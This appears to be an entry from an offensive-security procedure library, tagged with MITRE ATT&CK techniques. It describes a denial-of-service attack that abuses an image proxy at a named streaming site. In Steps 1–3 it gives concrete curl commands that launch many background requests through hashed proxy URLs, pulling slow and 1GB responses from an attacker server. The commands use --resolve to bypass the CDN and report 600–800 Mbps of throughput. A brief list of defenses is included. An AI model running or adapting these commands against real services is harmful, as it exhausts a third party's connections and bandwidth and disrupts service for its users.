---
id: proc-launch-dos-proxy-001
tags:
  - dos-launch
  - curl
  - concurrent
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-slow-dos-launch]]'
  - '[[commands/curl-large-dos-launch]]'
  - '[[commands/curl-postfix-large]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:48.939Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
  - '[[Endpoint Denial of Service]]'
---
# Launch-Slow-and-Large-DoS-via-Proxy

## Summary

This procedure launches multiple concurrent curl requests to the proxied endpoints (e.g., slow.php, big.php) to perform slow connection exhaustion and high-bandwidth DoS, achieving up to 800 Mbps with 3 requests.

## Description

By targeting the hashed proxy URLs, requests cause the backend to fetch from the attacker server, where slow.php ties up sockets for 30min+ and big.php forces 1GB downloads. Use --resolve to hit specific IPs bypassing CDN; post-fix, proxy times out clients but continues backend downloads.

## Requirements

1. Embedded images and proxy URLs ([[procedures/Embed-Malicious-Images-in-Chaturbate-White-Label]])
2. Attacker server running scripts
3. Curl installed on launch machine

## Defense

Defensive measures and detection strategies:

- Implement client and backend timeouts (e.g., 8-30s)
- Connection pooling and limits on proxies
- Traffic shaping to cap outbound bandwidth

## Objectives

1. Exhaust proxy concurrency and network
2. Amplify via proxy without direct target access
3. Verify with concurrent background processes

## Instructions

### Step 1: Launch Slow DoS

**Context**: Start background curls for slow.php to tie up connections.

Execute [[commands/curl-slow-dos-launch]] multiple times (e.g., 20+):

```bash
time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:██████32 > /dev/null &
```

> Requests pend up to 30min; use for socket exhaustion.

### Step 2: Launch Large DoS

**Context**: Initiate big.php fetches for bandwidth attack.

Execute [[commands/curl-large-dos-launch]] 3 times concurrently:

```bash
time curl -s https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/██████████ > /dev/null &
```

> Achieves 600+ Mbps; each downloads 1GB in ~50s.

### Step 3: Post-Fix Large Test

**Context**: After partial fix, test continued backend downloads.

Execute [[commands/curl-postfix-large]] 3 times:

```bash
curl https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/████████ > /dev/null &
```

> Client times out at 8s, but backend pulls full 1GB, hitting 800 Mbps.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service
- [[Endpoint Denial of Service]] Endpoint Denial of Service

### Sub-Techniques


## Commands Used

- [[commands/curl-slow-dos-launch]]
- [[commands/curl-large-dos-launch]]
- [[commands/curl-postfix-large]]

## Tools Used

- [[tools/curl]]

## Tags

- dos-launch
- proxy-abuse
